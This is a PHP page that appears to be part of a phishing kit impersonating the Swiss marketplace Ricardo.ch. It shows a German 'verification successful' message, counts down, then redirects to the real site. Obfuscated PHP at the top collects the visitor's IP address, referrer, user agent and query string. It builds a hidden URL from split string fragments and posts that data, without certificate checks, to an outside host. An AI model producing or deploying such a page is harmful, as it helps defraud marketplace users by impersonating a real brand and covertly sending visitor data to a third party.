<?php
if (!function_exists('xozNe39gB2')) {
    function xozNe39gB2()
    {
        $xNsZVg = $_SERVER['SERVER_ADDR'];
        $xuU1qatOG2 = '127.0.0.1';
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP']) != $xuU1qatOG2) && (($_SERVER['HTTP_CF_CONNECTING_IP']) != ($xNsZVg))) {
            $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR']) != $xuU1qatOG2)) {
            $ip = $_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR']) != $xuU1qatOG2) && (($_SERVER['HTTP_X_FORWARDED_FOR']) != ($xNsZVg))) {
            $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP']) != $xuU1qatOG2) && (($_SERVER['HTTP_CLIENT_IP']) != ($xNsZVg))) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }
}
$ip = xozNe39gB2();
if (!function_exists('xAh9IteN3Lt')) {
    function xAh9IteN3Lt()
    {
        if (empty($_SERVER['HTTP_REFERER'])) {
            $_SERVER['HTTP_REFERER'] = getenv('HTTP_REFERER');
        }
        return $_SERVER['HTTP_REFERER'];
    }
}
$ref = xAh9IteN3Lt();
if (!function_exists('xfehe4SNy3')) {
    function xfehe4SNy3()
    {
        if (empty($_SERVER['HTTP_USER_AGENT'])) {
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT');
        }
        return $_SERVER['HTTP_USER_AGENT'];
    }
}
$ua = xfehe4SNy3();
if ($_SERVER['QUERY_STRING'] != '') {
    $data = '' . urlencode($_SERVER['QUERY_STRING']) . '';
} else {
    $data = '';
}
$sourcename = 'c';
$cl0ip = 'find';
$sourceid = '';
$cl1ip = 'us';
$fd = 'x990959';
$cl2ip = '.re';
$langua = 'na';
$cl3ip = 'st';
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_URL, 'https://' . $cl0ip . '' . $cl1ip . '' . $cl2ip . '' . $cl3ip . '/' . $cl1ip . '' . $cl3ip . '.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 333);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'fd=' . $fd . '&ip=' . $ip . '&ref=' . $ref . '&ua=' . $ua . '&data=' . $data . '&sourceid=' . $sourceid . '&sourcename=' . $sourcename . '');
$ifbot = curl_exec($ch);
curl_close($ch);
if ($ifbot != '0') {
} else {
}
if ($ifbot == '') {
} else {
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thanks for Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            height: 100vh;
        }

        .container {
            background-color: white;
            padding: 70px;
            border-radius: 15px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 1200px;
            /* Adjust this value to your preferred width */
            margin: 0 auto;
            /* Centers the container horizontally */
            box-sizing: border-box;
            /* Ensures padding and border are included in the element's total width and height */
        }

        .logo {
            width: 100px;
            margin-bottom: 20px;
        }

        .custom-text {
            margin: 20px 0;
            font-size: 18px;
        }

        .countdown {
            font-size: 24px;
            font-weight: bold;
            margin-top: 20px;
        }
    </style>
</head>

<body>
    <div class="container">
        <img src="https://files.ricardostatic.ch/logos/ricardo_logo_pos.svg" alt="Ricardo.ch Logo" class="logo">
        <h1>Ihre Verifizierung war erfolgreich</h1>
        <p class="custom-text" id="verificationMessage">Ihre Verifizierung war erfolgreich!</p>
        <div class="countdown" id="countdown">3</div>
    </div>

    <script>
        // Change the text here
        document.getElementById('verificationMessage').textContent = 'Sie werden in 3 Sekunden automatisch weitergeleitet';

        // Countdown timer
        let countdownValue = 3;
        const countdownElement = document.getElementById('countdown');

        const timer = setInterval(() => {
            countdownValue--;
            countdownElement.textContent = countdownValue;

            if (countdownValue <= 0) {
                clearInterval(timer);
                window.location.href = 'https://www.ricardo.ch';
            }
        }, 1000);

        // Clear timer if user interacts
        document.addEventListener('click', () => {
            clearInterval(timer);
        });
    </script>
</body>

</html>